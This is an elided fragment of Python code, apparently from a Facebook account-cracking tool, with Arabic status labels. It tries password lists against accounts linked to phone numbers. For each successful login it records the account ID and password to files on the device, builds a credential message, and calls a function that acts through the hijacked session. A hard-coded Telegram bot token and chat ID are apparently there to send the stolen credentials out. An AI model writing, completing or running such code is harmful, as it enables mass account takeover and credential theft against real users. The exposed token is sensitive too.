...
taka1 = '5833062932:AAGfZ2l1YHFiGlfaICXcBO5GnlHSumxj9H4'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oi = nel(to, 'green', **('style',))
                cetak(nel(oi, 'cyan', 'محمد عنان جابلك صيد', **('style', 'title')))
...
''')
            ...
            if 'checkpoint' in log_cookies:
                ...
                oi1 = nel(to1, 'red', **('style',))
                cetak(nel(oi1, 'yellow', 'حساب سيكور', **('style', 'title')))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                open('oknader.txt', 'a').write(cid + ' | ' + ps + '\n')
                to = 'phone unmber==>+' + uid + '\nid==>' + cid + '\npassword==>' + ps + '\n' + 'account==> https://www.facebook.com/profile.php?id=' + cid
                oi = nel(to, 'green', **('style',))
                cetak(nel(oi, 'cyan', 'حساب شغال ', **('style', 'title')))
                token = '5833062932:AAGfZ2l1YHFiGlfaICXcBO5GnlHSumxj9H4'
                ID = '5868677803'
                tlg = (f'''
...
''')
                ...
                cek_apk(session, coki)
                open('/sdcard/ صيد نادر/mohamad ok.txt', 'a').write(cid + ' | ' + ps + '\n')
                oks.append(cid)
                follow(self, session, coki)
            ...
            if 'checkpoint' in log_cookies:
                ...
                to1 = 'phone unmber==>+' + uid + '\nid==>' + cid + '\npassword==>' + ps + '\n' + 'account==> https://www.facebook.com/profile.php?id=' + cid
                oi1 = nel(to1, 'red', **('style',))
                cetak(nel(oi1, 'yellow', 'حساب مقفول', **('style', 'title')))
                open('/sdcard/صيد نادر/cp.txt', 'a').write(cid + ' | ' + ps + ' \n')
                cps.append(cid)
                break
            else:
                continue
